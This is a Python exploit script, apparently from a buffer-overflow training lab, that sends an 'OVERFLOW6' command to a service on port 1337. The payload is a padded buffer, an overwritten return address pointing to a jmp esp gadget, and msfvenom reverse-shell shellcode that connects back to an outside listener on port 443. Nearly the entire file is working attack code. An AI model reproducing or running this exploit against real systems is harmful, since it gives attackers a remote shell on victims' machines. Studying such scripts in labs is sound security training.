#!/usr/bin/python

import socket, time

remoteip="10.10.95.102"
remoteport=1337

offset = "A" * 1034
#jmp esp 625011AF
eip = "\xaf\x11\x50\x62"
#msfvenom -p windows/shell_reverse_tcp lhost=10.13.46.217 lport=443 exitfunc=thread -b "\x00\x08\x2c\xad" -v esp -f python
esp =  b"\x90" * 16
esp += b"\xd9\xcf\xd9\x74\x24\xf4\xbe\xa6\xe2\xb9\x98\x5f\x29"
esp += b"\xc9\xb1\x52\x31\x77\x17\x83\xef\xfc\x03\xd1\xf1\x5b"
esp += b"\x6d\xe1\x1e\x19\x8e\x19\xdf\x7e\x06\xfc\xee\xbe\x7c"
esp += b"\x75\x40\x0f\xf6\xdb\x6d\xe4\x5a\xcf\xe6\x88\x72\xe0"
esp += b"\x4f\x26\xa5\xcf\x50\x1b\x95\x4e\xd3\x66\xca\xb0\xea"
esp += b"\xa8\x1f\xb1\x2b\xd4\xd2\xe3\xe4\x92\x41\x13\x80\xef"
esp += b"\x59\x98\xda\xfe\xd9\x7d\xaa\x01\xcb\xd0\xa0\x5b\xcb"
esp += b"\xd3\x65\xd0\x42\xcb\x6a\xdd\x1d\x60\x58\xa9\x9f\xa0"
esp += b"\x90\x52\x33\x8d\x1c\xa1\x4d\xca\x9b\x5a\x38\x22\xd8"
esp += b"\xe7\x3b\xf1\xa2\x33\xc9\xe1\x05\xb7\x69\xcd\xb4\x14"
esp += b"\xef\x86\xbb\xd1\x7b\xc0\xdf\xe4\xa8\x7b\xdb\x6d\x4f"
esp += b"\xab\x6d\x35\x74\x6f\x35\xed\x15\x36\x93\x40\x29\x28"
esp += b"\x7c\x3c\x8f\x23\x91\x29\xa2\x6e\xfe\x9e\x8f\x90\xfe"
esp += b"\x88\x98\xe3\xcc\x17\x33\x6b\x7d\xdf\x9d\x6c\x82\xca"
esp += b"\x5a\xe2\x7d\xf5\x9a\x2b\xba\xa1\xca\x43\x6b\xca\x80"
esp += b"\x93\x94\x1f\x06\xc3\x3a\xf0\xe7\xb3\xfa\xa0\x8f\xd9"
esp += b"\xf4\x9f\xb0\xe2\xde\xb7\x5b\x19\x89\xbd\x96\x0f\x90"
esp += b"\xaa\xaa\x4f\x23\x90\x22\xa9\x49\xf6\x62\x62\xe6\x6f"
esp += b"\x2f\xf8\x97\x70\xe5\x85\x98\xfb\x0a\x7a\x56\x0c\x66"
esp += b"\x68\x0f\xfc\x3d\xd2\x86\x03\xe8\x7a\x44\x91\x77\x7a"
esp += b"\x03\x8a\x2f\x2d\x44\x7c\x26\xbb\x78\x27\x90\xd9\x80"
esp += b"\xb1\xdb\x59\x5f\x02\xe5\x60\x12\x3e\xc1\x72\xea\xbf"
esp += b"\x4d\x26\xa2\xe9\x1b\x90\x04\x40\xea\x4a\xdf\x3f\xa4"
esp += b"\x1a\xa6\x73\x77\x5c\xa7\x59\x01\x80\x16\x34\x54\xbf"
esp += b"\x97\xd0\x50\xb8\xc5\x40\x9e\x13\x4e\x60\x7d\xb1\xbb"
esp += b"\x09\xd8\x50\x06\x54\xdb\x8f\x45\x61\x58\x25\x36\x96"
esp += b"\x40\x4c\x33\xd2\xc6\xbd\x49\x4b\xa3\xc1\xfe\x6c\xe6"

buffer = offset + eip + esp
while True:

    print "Fuzzing with %s bytes" % len(buffer)
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((remoteip, remoteport))
    except:
        print ("[-] Connection error!")
        sys.exit(1)

    print s.recv(1024)
    s.send("OVERFLOW6 " + buffer + '\r\n')
    print s.recv(1024)
    s.close()
    print "-------------------------"
